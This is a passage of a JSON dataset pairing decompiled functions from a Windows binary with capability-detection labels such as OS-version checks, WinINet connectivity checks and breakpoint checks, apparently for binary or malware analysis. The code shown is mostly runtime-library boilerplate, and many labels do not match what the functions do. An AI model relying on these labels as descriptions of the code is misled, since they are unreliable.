*(unaff_EBP + -0x40);\n                        puVar2[2] = *(unaff_EBP + -0x3c);\n                        puVar2[3] = *(unaff_EBP + -0x38);\n                        break;\n                    case 0x10:\n                    case 0x11:\n                        *(puVar2 + 2) = piVar8;\n                    }\n                }\n                *(unaff_EBP + -4) = 0;\n                fcn.0045bdda();\n                *(unaff_EBP + -4) = 0xffffffff;\n                if (*(unaff_EBP + -0x2c) != 0) {\n                    fcn.0042f689(0, *(unaff_EBP + -0x30));\n                }\n                goto code_r0x0045db26;\n            }\n            goto code_r0x0045d885;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x2c) == 0) goto code_r0x0045db26;\n        lpString = *(unaff_EBP + -0x30);\n    }\n    else {\n        lpString = iVar5 + 3;\n        stack0xffffffec = 0x45d880;\n        cVar3 = fcn.00401120();\n        if (cVar3 != '\\0') {\n            lpString = 0x45d8aa;\n            fcn.00462d70();\n            *(unaff_EBP + -0x10) = &stack0xfffffff4;\n            unique0x00007a00 = *(unaff_EBP + -0x18);\n            lpString = iVar5;\n            fcn.0041314e(&stack0xfffffff4, iVar5 + 3);\n            iVar4 = *(iVar6 + 0xc);\n            *(unaff_EBP + -0x18) = &stack0xfffffff4;\n            if (iVar4 == 8) {\n                iVar4 = 0xe;\n            }\n            *(unaff_EBP + -0x24) = 0;\n            (&stack0xfffffff4)[iVar5] = 0xff;\n            (&stack0xfffffff5)[iVar5] = iVar4;\n            (&stack0xfffffff6)[iVar5] = 0;\n            *(unaff_EBP + -0x28) = *(iVar6 + 0x14);\n            goto code_r0x0045d8e9;\n        }\ncode_r0x0045d885:\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x2c) == 0) goto code_r0x0045db26;\n        lpString = *(unaff_EBP + -0x30);\n    }\n    stack0xffffffec = 0;\n    fcn.0042f689();\ncode_r0x0045db26:\n    *(unaff_EBP + -0x70) = 0x45db2e;\n    fcn.004628aa();\n    return;\n}\n",
        "token_count": 3199
    },
    "0045dc4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0045dc4c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00411ec6();\n    *extraout_ECX = vtable.COleDispatchException.0;\n    fcn.0040f620();\n    *(unaff_EBP + -4) = 0;\n    fcn.0040f620();\n    fcn.0040f620();\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 2;\n    extraout_ECX[4] = -(*(unaff_EBP + 0xc) != 0) & *(unaff_EBP + 0xc) + 0x60000U;\n    *(extraout_ECX + 2) = iVar1;\n    if (iVar2 != 0) {\n        fcn.00413a3a(*(unaff_EBP + 8));\n    }\n    extraout_ECX[7] = (-(iVar1 != 0) & 0x7fff0001) + 0x8000ffff;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 360
    },
    "0045e413": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0045e413(int32_t param_1, uint param_2, int32_t param_3)\n\n{\n    int32_t *unaff_retaddr;\n    \n    if (param_3 != 0) {\n        *(param_1 + 4) = param_2;\n        *(param_1 + 0xc) = *0x49f9b8;\n        *(param_1 + 0x10) = *0x49f9bc;\n        *(param_1 + 0x14) = *0x49f9c0;\n        *(param_1 + 0x18) = *0x49f9c4;\n        fcn.00431b26(param_1 + 0x1c);\n        fcn.00431b26(param_1 + 8);\n        *(param_1 + 8) = unaff_retaddr;\n        (**(*unaff_retaddr + 4))(unaff_retaddr);\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "0045e747": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045e747(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x4b8030) {\n        return;\n    }\n    *0x4bb870 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4bb874 = &arg_8h;\n    *0x4bb7b0 = 0x10001;\n    *0x4bb758 = 0xc0000409;\n    *0x4bb75c = 1;\n    var_328h = *0x4b8030;\n    var_324h = *0x4b8034;\n    *0x4bb764 = unaff_retaddr;\n    *0x4bb83c = in_GS;\n    *0x4bb840 = in_FS;\n    *0x4bb844 = in_ES;\n    *0x4bb848 = in_DS;\n    *0x4bb84c = unaff_EDI;\n    *0x4bb850 = unaff_ESI;\n    *0x4bb854 = unaff_EBX;\n    *0x4bb858 = in_EDX;\n    *0x4bb85c = in_ECX;\n    *0x4bb860 = in_EAX;\n    *0x4bb864 = unaff_EBP;\n    *0x4bb868 = unaff_retaddr;\n    *0x4bb86c = in_CS;\n    *0x4bb878 = in_SS;\n    *0x4bb7a8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.004739c9(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x49c770);\n    if (*0x4bb7a8 == 0) {\n        fcn.004739c9(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 840
    },
    "0045f11e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f11e(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0045e756(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004624d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004624d7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x462580;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.004625ac;\n        uStack36 = *0x4b8030 ^ &fcn.004624d7::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.004624d7::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00467e3f();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.004624d7::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 723
    },
    "00463cbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00463d51: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00463d56)\n// WARNING: Removing unreachable block (ram,0x00463d84)\n// WARNING: Removing unreachable block (ram,0x00463d5c)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00463cbc(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b0478, 0xc);\n    fcn.00465cd3(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x4bb748 != 1) {\n        *0x4bb744 = 1;\n        *0x4bb740 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            uVar1 = fcn.00467c01(*0x4bd448);\n            uVar2 = fcn.00467c01(*0x4bd444);\n            *(unaff_EBP + -0x1c) = uVar2;\n            if (uVar1 != 0) {\n                while (*(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + -4,  uVar1 <= *(unaff_EBP + -0x1c)) {\n                    if (**(unaff_EBP + -0x1c) != NULL) {\n                        (***(unaff_EBP + -0x1c))();\n                    }\n                }\n            }\n            fcn.00463a5d(0x492a40);\n        }\n        fcn.00463a5d(0x492a4c);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00465be3(8);\n    }\n    return;\n}\n",
        "token_count": 498
    },
    "0046450f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046450f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.00464466(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 124
    },
    "00464c4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464c4c(uint arg_8h, uint arg_ch, uint noname_2, uint noname_3, uint arg_18h)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x20) == 0) {\n        fcn.00464466(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x1c), *(unaff_EBP + 0x18));\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00469039": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00469039(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00467e3f();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00467e3f();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "004696cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004696cf(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00462705(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00467e3f();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00467e3f();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.004626e4(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00469099(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00471695": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00471695(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00465be3(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00482e61": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00482e61(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00483360;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00482f94;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00482f9b;\ncode_r0x00482f94:\n                        do {\n                            var_4h = 1;\ncode_r0x00482f9b:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00482fa9;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00482fa9:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x4b914c - str.5_v_[0]) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x4b914c < iVar12) {\n                if (iVar12 < *0x4b9148) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + str.5_v_[3];\n                    iVar4 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = str.5_v_[1] & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = str.5_v_[3] + *0x4b9148;\n                    uVar5 = 1;\n                }\n                goto code_r0x00483360;\n            }\n            var_10h = *0x4b914c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = str.5_v_[0] + L'\\xffffffff';\n            iVar12 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar10 = str.5_v_[0] & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x0048314c;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x0048314c:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = str.5_v_[1] + L'\\x01';\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00483360:\n    var_20h = iVar12 << (0x1fU - str.5_v_[1] & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3668
    },
    "004833a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004833a3(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x004838a2;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x4b9168 - 1;\n        iVar4 = *0x4b9168 + (*0x4b9168 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x4b9168 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto 